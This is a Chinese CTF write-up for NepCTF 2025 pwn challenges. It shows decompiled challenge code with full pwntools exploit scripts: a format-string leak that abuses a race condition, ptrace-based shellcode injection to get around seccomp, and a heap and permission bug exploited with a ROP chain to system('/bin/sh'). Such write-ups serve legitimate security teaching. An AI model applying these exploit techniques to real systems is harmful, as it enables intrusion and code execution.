# Nepctf2025 PWN部分题解

> 原文: https://www.ctfiot.com/272018.html
> ID: 272018

unsigned __int64 input_my_name(){
char *argv[5]; // [rsp+10h] [rbp-30h] BYREF
unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
puts("please input your name:");
  __isoc99_scanf("%100s", name);
puts("I will tell you all file names in the current directory!");
  argv[0] = "/bin/ls";
  argv[1] = "/";
  argv[2] = "-al";
  argv[3] = 0LL;
if ( !fork() )
execve("/bin/ls", argv, 0LL);
wait(0LL);
puts("good luck :-)");
return v2 - __readfsqword(0x28u);
}

__int64 input_filename(){
puts("input file name you want to read:");
  __isoc99_scanf("%s", file);
if ( !strstr(file, "flag") )
return 1LL;
puts("flag is not allowed!");
return 0LL;
}

unsigned __int64 __fastcall work(void *a1){
unsignedint v1; // eax
int i; // [rsp+4h] [rbp-46Ch]
int j; // [rsp+8h] [rbp-468h]
int fd; // [rsp+Ch] [rbp-464h]
char v6[96]; // [rsp+10h] [rbp-460h] BYREF
char v7[16]; // [rsp+70h] [rbp-400h] BYREF
char buf[1000]; // [rsp+80h] [rbp-3F0h] BYREF
unsigned __int64 v9; // [rsp+468h] [rbp-8h]

  v9 = __readfsqword(0x28u);
md5_1_(v6);
  v1 = strlen(file);
md5_2_(v6, file, v1);
md5_3_(v6, v7);
puts("I will tell you last file name content in md5:");
for ( i = 0; i <= 15; ++i )
printf("%02X", (unsigned __int8)v7[i]);
putchar(10);
for ( j = 0; j <= 999; ++j )
    buf[j] = 0;
  fd = open(file, 0);
if ( fd >= 0 )
  {
read(fd, buf, 0x3E8uLL);
close(fd);
printf("hello ");
printf(name);
puts(" ,your file read done!");
  }
else
  {
puts("file not found!");
  }
return v9 - __readfsqword(0x28u);
}

多线程环境中共享资源未加锁（或锁不当）

同时发生

调度由内核或调度器决定

from pwn import *
#io=process('./pwn')
context.log_level='debug'
io=remote("nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com",443,ssl=True,sni="nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com")
def bug():
    gdb.attach(io)
name=f"%{12+9}$p".encode()
for  i in range(0x10):
    name+=f"-%{13+9+i}$p".encode()
io.sendlineafter(b"please input your name:n",name)
file=b"time"
io.sendlineafter(b"input file name you want to read:n",file)
io.sendlineafter(b"input file name you want to read:n",b"flag")

io.interactive()

def hex_to_string(hex_list):
    result = b""
for val in hex_list:
        num = int(val, 16)
# 计算需要多少字节表示这个数
        byte_len = (num.bit_length() + 7) // 8
# 转换为字节串（小端）
        b = num.to_bytes(byte_len, byteorder='little')
        result += b
return result.decode(errors='replace')  # errors='replace' 防止乱码崩溃

hex_data = [
"0x2bc422698ba00f71",
"0x627b46544370654e",
"0x2d31376661383262",
"0x3162372d66323762",
"0x382d363633612d64",
"0x3632326534363763",
"0xa7d353564"
]

print(hex_to_string(hex_data))

#q��i"�+NepCTF{bb28af71-b72f-7b1d-a366-8c764e226d55}

int __fastcall main(int argc, constchar **argv, constchar **envp){
__pid_t pid; // [rsp+4h] [rbp-Ch]

setbuf(stdin, 0LL);
setbuf(stdout, 0LL);
setbuf(stderr, 0LL);
if ( mmap((void *)0xDEADC0DE000LL, 0x1000uLL, 7, 50, -1, 0LL) == (void *)0xDEADC0DE000LL )
  {
puts("[+] please input your shellcode: ");
    pid = fork();
if ( pid < 0 )
    {
perror("fork");
exit(1);
    }
if ( !pid )
    {
while ( 1 )
        ;
    }
read(0, (void *)0xDEADC0DE000LL, 0x1000uLL);
install_seccomp();
    MEMORY[0xDEADC0DE000]();
return 0;
  }
else
  {
perror("mmap");
return 1;
  }
}

line  CODE  JT   JF      K
=================================
0000:0x20 0x00 0x00 0x00000000  A = sys_number
0001:0x15 0x00 0x01 0x00000065  if (A !=ptrace) goto 0003
0002:0x06 0x00 0x00 0x7fff0000  return ALLOW
0003:0x06 0x00 0x00 0x00000000  return KILL

#include <sys/ptrace.h>
longptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);

from pwn import *
#io=process('./pwn')
io=remote("nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com",443,ssl=True,sni="nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com")
context.arch='amd64'
context.log_level='debug'
def bug():
    gdb.attach(io,"b read")
io.recvuntil(b"[+] please input your shellcode: ")
shellcode =asm("mov r14d, DWORD PTR [rbp-0xc]")
print("已获得子进程pid")
"""orw
0xdeadc0de000:	0x010101010101b848	0x672e2fb848500101
0xdeadc0de010:	0x043148010166606d	0xf631d231e7894824
0xdeadc0de020:	0x01ba41050f58026a	0x0301f28141010102
0xdeadc0de030:	0x6ad2315f016a0101	0x00050f58286a5e03
"""
shellcode+=asm(shellcraft.ptrace(16,"r14"))
shellcode+=asm('''
    mov rcx,0x500000000
loop:
    sub rcx,1
    test rcx,rcx
    jnz loop
        ''')
print("进程附加成功")
shellcode+=asm(shellcraft.ptrace(12,"r14",0,0xDEADC0DE000+0x500))
shellcode+=asm("mov rsp,0xDEADC0DE588;mov rax, 0xDEADC0DE000;push rax;mov rsp,0xDEADC0DE800")
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000,0x010101010101b848))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+8,0x672e2fb848500101))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x10,0x043148010166606d))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x18,0xf631d231e7894824))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x20,0x01ba41050f58026a))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x28,0x0301f28141010102))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x30,0x6ad2315f016a0101))
shellcode+=asm(shellcraft.ptrace(5, "r14", 0xDEADC0DE000+0x38,0x00050f58286a5e03))
#================================================================================================================
shellcode+=asm(shellcraft.ptrace(13,"r14",0,0xDEADC0DE000+0x500))
#================================================================================================================
shellcode+=asm(shellcraft.ptrace(17,"r14", 0, 0))
shellcode+=asm("jmp $")
io.send(shellcode)
io.interactive()

int __fastcall __noreturn main(int argc, constchar **argv, constchar **envp){
int v3; // [rsp+Ch] [rbp-14h] BYREF
  __int64 v4; // [rsp+10h] [rbp-10h]
unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
initstream(argc, argv, envp);
  v3 = 0;
  v4 = init();
while ( 1 )
  {
puts("Which permission do you want to log in with?(1:manager 1000:user)");
    __isoc99_scanf("%d", &v3);
puts("What action do you want to take?");
if ( v3 == 1 )
    {
manager_operation(v4);
    }
else if ( v3 == 1000 )
    {
user_operation();
    }
  }
}

00000000 usr_chunk       struc ; (sizeof=0x18, mappedto_8)
00000000 chunk           dq ?  //堆地址
00000008 right           dq ?  //权限
00000010 operat_code     dq ?  //操作码

__int64 init(){
int i; // [rsp+Ch] [rbp-14h]
void *v2; // [rsp+10h] [rbp-10h]
  __int64 v3; // [rsp+18h] [rbp-8h]

  v2 = malloc(0x2000uLL);
  chunk_list[0] = (__int64)v2;
  right_list[0] = 0x10;
for ( i = 1; i <= 19; ++i )                   //right_mark
  {
    chunk_list[2 * i] = (__int64)v2 + 0x100 * i;
if ( i > 9 )
      right_list[4 * i] = 3;                    // usr
else
      right_list[4 * i] = 2;                    // manage
  }
  onlyuser = 1000;
  operat_chunk = (usr_chunk *)malloc(0x18uLL);
LODWORD(operat_chunk->operat_code) = 0;
  operat_chunk->chunk = 0LL;
LODWORD(operat_chunk->right) = 0;
  v3 = chunk_list[0];
  *(_DWORD *)chunk_list[0] = 1;
  *(_QWORD *)(v3 + 0x10) = &onlyuser;
  *(_QWORD *)(v3 + 8) = malloc(0x18uLL);
  *(_DWORD *)(*(_QWORD *)(v3 + 8) + 16LL) = 0;
  **(_QWORD **)(v3 + 8) = 0LL;
  *(_DWORD *)(*(_QWORD *)(v3 + 8) + 8LL) = 0;
return v3;
}

ssize_tuser_operation(){
ssize_t result; // rax
signedint v1; // [rsp+Ch] [rbp-24h] BYREF
char s[24]; // [rsp+10h] [rbp-20h] BYREF
unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0;
memset(s, 0, 0x10uLL);
puts("user read from logs(USER_read)");
puts("user write to logs(USER_write)");
read(0, s, 0xFuLL);
puts("Which storage area do you want to operate on?");
puts("10-19: user can visit");
  __isoc99_scanf("%d", &v1);
if ( (unsignedint)check(v1, s, 1000) )
  {
    operat_chunk->chunk = chunk_list[2 * v1];
LODWORD(operat_chunk->right) = right_list[4 * v1];
permission_confirm((__int64)operat_chunk, s);
if ( LODWORD(operat_chunk->operat_code) == 1 )
    {
return read(0, (void *)operat_chunk->chunk, 0xFFuLL);// "USER_write"
    }
else
    {
      result = LODWORD(operat_chunk->operat_code);
if ( (_DWORD)result == 4 )
return write(1, (constvoid *)operat_chunk->chunk, 0xFFuLL);// "USER_read"
    }
  }
else
  {
puts("permission denied");
return 0xFFFFFFFFLL;
  }
return result;
}

__int64 __fastcall check(unsignedint Id, constchar *s, int a3){
  __int64 *v5; // [rsp+18h] [rbp-8h]

if ( Id >= 20 )                 
return 0LL;
if ( strcmp(s, "MANAGER_visit")
    && strcmp(s, "MANAGER_read")
    && strcmp(s, "MANAGER_write")
    && strcmp(s, "USER_read")
    && strcmp(s, "USER_write") )
  {
return 0LL;
  }
  v5 = &chunk_list[2 * (int)Id];
if ( a3 == 1000 )
  {
if ( !strcmp(s, "USER_write") && (v5[1] & 1) == 0 )
return 0LL;
  }
else if ( !strcmp(s, "MANAGER_write") )
  {
if ( (v5[1] & 2) == 0 )
return 0LL;
  }
else if ( !strcmp(s, "MANAGER_visit") && !operat_chunk->chunk )
  {
return 0LL;
  }
return 1LL;
}

int __fastcall permission_confirm(__int64 a1, constchar *a2){
int result; // eax

if ( !strcmp(a2, "MANAGER_visit") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 8;
  }
else if ( !strcmp(a2, "MANAGER_read") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 4;
  }
else if ( !strcmp(a2, "MANAGER_write") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 2;
  }
else if ( !strcmp(a2, "USER_read") )
  {
    result = a1;
    *(_DWORD *)(a1 + 0x10) = 4;
  }
else
  {
    result = strcmp(a2, "USER_write");
if ( !result )
    {
      result = a1;
      *(_DWORD *)(a1 + 0x10) = 1;
    }
  }
return result;
}

ssize_t __fastcall manager_operation(__int64 a1){
ssize_t result; // rax
int v2; // [rsp+18h] [rbp-28h] BYREF
signedint Id; // [rsp+1Ch] [rbp-24h] BYREF
char s[24]; // [rsp+20h] [rbp-20h] BYREF
unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v2 = 0;
  Id = 0;
memset(s, 0, 0x10uLL);
puts("manager read from logs(MANAGER_read)");
puts("manager write to logs(MANAGER_write)");
puts("visit user(MANAGER_visit)");
read(0, s, 0xFuLL);                           // "MANAGER_visit"
// "MANAGER_read"
// "MANAGER_write"
puts("Which storage area do you want to operate on?");
puts("1-19: manager can visit");
  __isoc99_scanf("%d", &Id);
if ( !(unsignedint)check(Id, s, 1) )
  {
puts("permission denied");
return 0xFFFFFFFFLL;
  }
  **(_QWORD **)(a1 + 8) = chunk_list[2 * Id];
  *(_DWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = right_list[4 * Id];
permission_confirm(*(_QWORD *)(a1 + 8), s);
if ( *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) == 8 )// "MANAGER_visit"
  {
puts("1: manager visit user to read from user_logs");
puts("2: manager visit user to write to user_logs");
    __isoc99_scanf("%d", &v2);
if ( !checkvisit(v2) )
    {
puts("permission denied visit");
return 0xFFFFFFFFLL;
    }
if ( v2 == 1 )
    {
      *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) = 6;
    }
else if ( v2 == 2 )
    {
      *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) = 3;
    }
  }
switch ( *(_DWORD *)(*(_QWORD *)(a1 + 8) + 0x10LL) )
  {
case 6:
return write(1, **(constvoid ***)(*(_QWORD *)(a1 + 0x10) + 8LL), 0xFFuLL);// "1: manager visit user to read from user_logs"
case 3:
return read(0, **(void ***)(*(_QWORD *)(a1 + 0x10) + 8LL), 0xFFuLL);// "2: manager visit user to write to user_logs"
case 4:
return write(1, **(constvoid ***)(a1 + 8), 0xFFuLL);// "MANAGER_read"
  }
  result = *(unsignedint *)(*(_QWORD *)(a1 + 8) + 0x10LL);
if ( (_DWORD)result == 2 )                    // "MANAGER_write"
return read(0, **(void ***)(a1 + 8), 0xFFuLL);
return result;
}

_BOOL8 __fastcall checkvisit(int a1){
if ( a1 == 1 )
return 1LL;
return a1 != 2 || (operat_chunk->operat_code & 4) == 0;
}

from pwn import *
io=process('./pwn')
#io=remote("nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com",443,ssl=True,sni="nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com")
libc=ELF('libc.so.6')
def bug():
    gdb.attach(io)
def ch(Id):
    io.sendlineafter(b"(1:manager 1000:user)n",str(Id).encode())
def usr_write(Id,payload):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_write")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
    io.send(payload)
def usr_read(Id):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_read")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
def man_write(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_write")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.send(payload)
def man_read(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_read")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
def man_write_usr(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"2")
    io.send(payload)
def man_read_usr(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"1")

man_read(0)
io.recvuntil(b"x01x00x00x00x00x00x00x00")
heap=u64(io.recv(8))-0x22d0
pie=u64(io.recv(8))-0x41a0
print(f"heap=>{hex(heap)}")
print(f"pie=>{hex(pie)}")

def get_right():
ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"MANAGER_visit")
    io.sendlineafter(b"10-19: user can visitn",str(0).encode())

usr_write(10,b'a'*0x50)
get_right()
head=heap+0x2a0#即chank[0]的地址

man_write_usr(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4068))
man_write_usr(0,p64(0xf))#修改权限

man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4020))
man_read_usr(0)
io.recvline()
#===
base=u64(io.recv(8))-0x21b780
print(f"base=>{hex(base)}")

stack=base+libc.sym.environ
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack))
man_read_usr(0)
io.recvline()
stack=u64(io.recv(8))
print(f"stack=>{hex(stack)}")

man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack-0x150))
#-0x150
rdi=base+0x000000000002a3e5
system=base+0x50d70
bin_sh=base+0x00000000001d8678

payload=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)
man_write_usr(0,payload)

io.interactive()

from pwn import *
io=process('./pwn')
#io=remote("nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com",443,ssl=True,sni="nepctf32-nhc3-ipgm-a41k-fqjcvtlc0394.nepctf.com")
libc=ELF('libc.so.6')
def bug():
    gdb.attach(io)
def ch(Id):
    io.sendlineafter(b"(1:manager 1000:user)n",str(Id).encode())
def usr_write(Id,payload):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_write")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
    io.send(payload)
def usr_read(Id):
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"USER_read")
    io.sendlineafter(b"10-19: user can visitn",str(Id).encode())
def man_write(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_write")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.send(payload)
def man_read(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_read")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
def man_write_usr(Id,payload):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"2")
    io.send(payload)
def man_read_usr(Id):
    ch(1)
    io.sendafter(b"visit user(MANAGER_visit)n",b"MANAGER_visit")
    io.sendlineafter(b"1-19: manager can visit",str(Id).encode())
    io.sendlineafter(b"2: manager visit user to write to user_logs",b"1")
def get_right():
    ch(1000)
    io.sendafter(b"user write to logs(USER_write)n",b"MANAGER_visit")
    io.sendlineafter(b"10-19: user can visitn",str(0).encode())
man_read(0)
bug()
io.recvuntil(b"x01x00x00x00x00x00x00x00")
heap=u64(io.recv(8))-0x22d0
pie=u64(io.recv(8))-0x41a0
print(f"heap=>{hex(heap)}")
print(f"pie=>{hex(pie)}")
usr_write(10,b'a'*0x50)
get_right()

head=heap+0x2a0
man_write_usr(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4068))
man_write_usr(0,p64(0xf))
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(pie+0x4020))
man_read_usr(0)
io.recvline()
#===
base=u64(io.recv(8))-0x21b780
print(f"base=>{hex(base)}")
stack=base+libc.sym.environ
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack))
man_read_usr(0)
io.recvline()
stack=u64(io.recv(8))
print(f"stack=>{hex(stack)}")
man_write(0,p64(0)+p64(heap+0x22d0)+p64(head+0x18)+p64(head+0x20)+p64(head+0x28)+p64(stack-0x150))
#-0x150
rdi=base+0x000000000002a3e5
system=base+0x50d70
bin_sh=base+0x00000000001d8678

payload=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)
man_write_usr(0,payload)

io.interactive()

#NepCTF{8e23f408-a803-a4fd-6766-cda58af313ee}

void __fastcall __noreturn main(void *a1, char **a2, char **a3){
int v3; // [rsp+4h] [rbp-2Ch] BYREF
unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
init();
while ( 1 )
  {
while ( 1 )
    {
menu(a1, a2);
      a2 = (char **)&v3;
      a1 = &std::cin;
      std::istream::operator>>(&std::cin, &v3);
if ( v3 != 1 )
break;
visit();
    }
if ( v3 != 2 )
exit(0);
leave();
  }
}

void init()
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  stream = fopen("flag", "r");
if ( stream )
  {
if ( fgets(byte_4053C0, 64, stream) )
    {
      qword_4053B0 = seccomp_init(0LL);
if ( qword_4053B0 )
      {
        seccomp_rule_add(qword_4053B0, 2147418112LL, 0LL, 0LL);
        seccomp_rule_add(qword_4053B0, 2147418112LL, 1LL, 0LL);
        seccomp_rule_add(qword_4053B0, 2147418112LL, 3LL, 0LL);
        seccomp_rule_add(qword_4053B0, 2147418112LL, 202LL, 0LL);
        seccomp_load(qword_4053B0);
      }
else
      {
        perror("seccomp_init");
      }
    }
else
    {
      perror("Error reading flag");
    }
  }
else
  {
    perror("Error opening flag");
  }
}

.text:0000000000401F19 ;   catch(char const*) // owned by 401ED4
.text:0000000000401F19                 endbr64
.text:0000000000401F1D                 cmp     rdx, 1
.text:0000000000401F21                 jz      short loc_401F2B
.text:0000000000401F23                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401F26                 call    __Unwind_Resume
.text:0000000000401F2B ; ---------------------------------------------------------------------------
.text:0000000000401F2B
.text:0000000000401F2B loc_401F2B:                             ; CODE XREF: main+6E↑j
.text:0000000000401F2B                 mov     rdi, rax        ; void *
.text:0000000000401F2E                 call    ___cxa_begin_catch
.text:0000000000401F33                 mov     [rbp+var_20], rax
.text:0000000000401F37 ;   try {
.text:0000000000401F37                 call    sub_4016EC

.text:0000000000401F7B ;   catch(char const*) // owned by 401EEA
.text:0000000000401F7B                 endbr64
.text:0000000000401F7F                 cmp     rdx, 1
.text:0000000000401F83                 jz      short loc_401F8D
.text:0000000000401F85                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401F88                 call    __Unwind_Resume
.text:0000000000401F8D ; ---------------------------------------------------------------------------
.text:0000000000401F8D
.text:0000000000401F8D loc_401F8D:                             ; CODE XREF: main+D0↑j
.text:0000000000401F8D                 mov     rdi, rax        ; void *
.text:0000000000401F90                 call    ___cxa_begin_catch
.text:0000000000401F95                 mov     [rbp+var_28], rax
.text:0000000000401F99                 lea     rax, aYouCatchTheErr ; "you catch the error "
.text:0000000000401FA0                 mov     rsi, rax
.text:0000000000401FA3                 lea     rax, _ZSt4cout  ; std::cout
.text:0000000000401FAA                 mov     rdi, rax
.text:0000000000401FAD ;   try {
.text:0000000000401FAD                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator<<<std::char_traits<char>>(std::ostream &,char const*)
.text:0000000000401FB2                 mov     rdx, rax
.text:0000000000401FB5                 mov     rax, [rbp+var_28]
.text:0000000000401FB9                 mov     rsi, rax
.text:0000000000401FBC                 mov     rdi, rdx
.text:0000000000401FBF                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator<<<std::char_traits<char>>(std::ostream &,char const*)
.text:0000000000401FC4                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr
.text:0000000000401FCB                 mov     rsi, rdx
.text:0000000000401FCE                 mov     rdi, rax
.text:0000000000401FD1                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator<<(std::ostream & (*)(std::ostream &))
.text:0000000000401FD6                 lea     rax, aHereIsAGiftFor ; "here is a gift for you!"
.text:0000000000401FDD                 mov     rsi, rax
.text:0000000000401FE0                 lea     rax, _ZSt4cout  ; std::cout
.text:0000000000401FE7                 mov     rdi, rax
.text:0000000000401FEA                 call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc ; std::operator<<<std::char_traits<char>>(std::ostream &,char const*)
.text:0000000000401FEF                 mov     rdx, cs:_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ptr
.text:0000000000401FF6                 mov     rsi, rdx
.text:0000000000401FF9                 mov     rdi, rax
.text:0000000000401FFC                 call    __ZNSolsEPFRSoS_E ; std::ostream::operator<<(std::ostream & (*)(std::ostream &))
.text:0000000000402001                 mov     rax, cs:setbuf_ptr
.text:0000000000402008                 mov     rsi, rax
.text:000000000040200B                 lea     rax, format     ; "setbufaddr:%pn"
.text:0000000000402012                 mov     rdi, rax        ; format
.text:0000000000402015                 mov     eax, 0
.text:000000000040201A                 call    _printf
.text:000000000040201F                 lea     rax, [rbp+var_2C]
.text:0000000000402023                 mov     rsi, rax
.text:0000000000402026                 lea     rax, aStackaddrP ; "stackaddr:%pn"
.text:000000000040202D                 mov     rdi, rax        ; format
.text:0000000000402030                 mov     eax, 0
.text:0000000000402035                 call    _printf
.text:0000000000402035 ;   } // starts at 401FAD
.text:000000000040203A                 call    ___cxa_end_catch
.text:000000000040203F                 jmp     loc_401ED4
.text:0000000000402044 ; ---------------------------------------------------------------------------
.text:0000000000402044 ;   cleanup() // owned by 401FAD

unsigned __int64 visit()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  _QWORD *exception; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  int v15; // [rsp+8h] [rbp-18h] BYREF
  int v16; // [rsp+Ch] [rbp-14h] BYREF
  int i; // [rsp+10h] [rbp-10h]
  int j; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v19; // [rsp+18h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "going to nep...");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "you are in nep!");
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  v2 = std::operator<<<std::char_traits<char>>(&std::cout, "you meet a crossing");
  std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "you can choose your path");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v4 = std::operator<<<std::char_traits<char>>(&std::cout, "1.left");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(&std::cout, "2.right");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v6 = std::operator<<<std::char_traits<char>>(&std::cout, "3.stright");
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "your choice >>");
  std::istream::operator>>(&std::cin, &v15);
if ( v15 == 1 )                               // left-->create
  {
for ( i = 0; i <= 1; ++i )
    {
if ( *((_QWORD *)&chunk_list + i) )
      {
if ( i == 1 )
        {
          v10 = std::operator<<<std::char_traits<char>>(&std::cout, "no free chunks");
          std::ostream::operator<<(v10, &std::endl<char,std::char_traits<char>>);
        }
      }
else
      {
if ( size_list[i] )
        {
if ( size_list[i] <= 0 )
          {
            exception = __cxa_allocate_exception(8uLL);
            *exception = "invalid size";
            __cxa_throw(exception, (struct type_info *)&`typeinfo for'charconst*, 0LL);
          }
          *((_QWORD *)&chunk_list + i) = malloc(size_list[i]);
if ( *((_QWORD *)&chunk_list + i) )
            v7 = std::operator<<<std::char_traits<char>>(&std::cout, "malloc success");
else
            v7 = std::operator<<<std::char_traits<char>>(&std::cout, "malloc failed");
          std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
break;
        }
        v9 = std::operator<<<std::char_traits<char>>(&std::cout, "invalid size");
        std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
      }
    }
  }
if ( v15 == 2 )
  {
for ( j = 0; j <= 1; ++j )
    {
if ( !size_list[j] )
      {
        std::operator<<<std::char_traits<char>>(&std::cout, "size:");
        __isoc99_scanf("%d", &size_list[j]);
break;
      }
if ( j == 1 )
      {
        v11 = std::operator<<<std::char_traits<char>>(&std::cout, "no more size");
        std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
      }
    }
  }
if ( v15 == 3 )
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "index:");
    __isoc99_scanf("%d", &v16);
if ( *((_QWORD *)&chunk_list + v16) )
    {
      std::operator<<<std::char_traits<char>>(&std::cout, "content:");
if ( read(0, *((void **)&chunk_list + v16), size_list[v16]) > 0 )
      {
        v13 = std::operator<<<std::char_traits<char>>(&std::cout, "success");
        std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
      }
    }
else
    {
      v12 = std::operator<<<std::char_traits<char>>(&std::cout, "invalid index");
      std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
    }
  }
return v19 - __readfsqword(0x28u);
}

一旦抛出异常，程序会开始逐级退栈，调用每个函数的析构函数来清理资源(RAII)

，直到找到能处理异常的 catch 语句

如果找不到，就会调用 std::terminate()

异常对象的类型（如 std::runtime_error）会被用来比对每一层的异常处理表（这些表通常是编译器生成的结构体或元数据）

一旦匹配成功，就跳转到对应的 catch 块执行，继续正常执行

每个函数的返回地址（RIP）存在于栈帧中

栈展开时，会查看返回地址对应的代码段

根据地址查询异常表 .eh_frame，决定：

是否有处理器

是否要执行析构器

是否要跳到下一个栈帧

if ( size_list[v5] > 16 )
      {
        exception = __cxa_allocate_exception(8uLL);
        *exception = "stack overflow";
        __cxa_throw(exception, (struct type_info *)&`typeinfo for'charconst*, 0LL);
      }

00:0000│  0x405000 —▸ 0x404dd8 ◂— 1
01:0008│  0x405008 —▸ 0x7ffff7ffe2e0 ◂— 0
02:0010│  0x405010 —▸ 0x7ffff7fd8d30 ◂— endbr64 
03:0018│  0x405018 (printf@got[plt]) —▸ 0x401030 ◂— endbr64 
04:0020│  0x405020 (strcspn@got[plt]) —▸ 0x401040 ◂— endbr64 
05:0028│  0x405028 (__cxa_begin_catch@got.plt) —▸ 0x401050 ◂— endbr64 
06:0030│  0x405030 (__cxa_allocate_exception@got.plt) —▸ 0x401060 ◂— endbr64 
